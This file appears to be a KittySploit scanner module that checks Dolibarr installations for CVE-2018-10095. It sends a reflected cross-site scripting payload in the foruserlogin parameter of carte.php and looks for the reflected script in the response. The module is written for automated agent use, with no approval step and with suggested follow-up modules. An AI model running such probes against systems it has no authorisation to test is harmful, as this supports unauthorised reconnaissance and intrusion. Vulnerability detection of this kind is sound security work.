#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Dolibarr before 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dolibarr <7.0.2 - Cross-Site Scripting Detection',
        'description': 'Dolibarr before 7.0.2 is vulnerable to cross-site scripting and allows remote attackers to inject arbitrary web script or HTML via the foruserlogin parameter to adherents/cartes/carte.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'xss', 'dolibarr', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://sysdream.com/news/lab/2018-05-21-cve-2018-10095-dolibarr-xss-injection-vulnerability/',
            'https://github.com/Dolibarr/dolibarr/commit/1dc466e1fb687cfe647de4af891720419823ed56',
            'https://github.com/Dolibarr/dolibarr/blob/7.0.2/ChangeLog',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-10095',
            'http://www.openwall.com/lists/oss-security/2018/05/21/3',
        ],
        'cve': 'CVE-2018-10095',
    }

    def run(self):
        r = self.http_request(method="GET", path='/dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&model=5160&optioncss=print', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Dolibarr <7.0.2 - Cross-Site Scripting detected",
                path='/dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&model=5160&optioncss=print',
            )
            return True
        return False

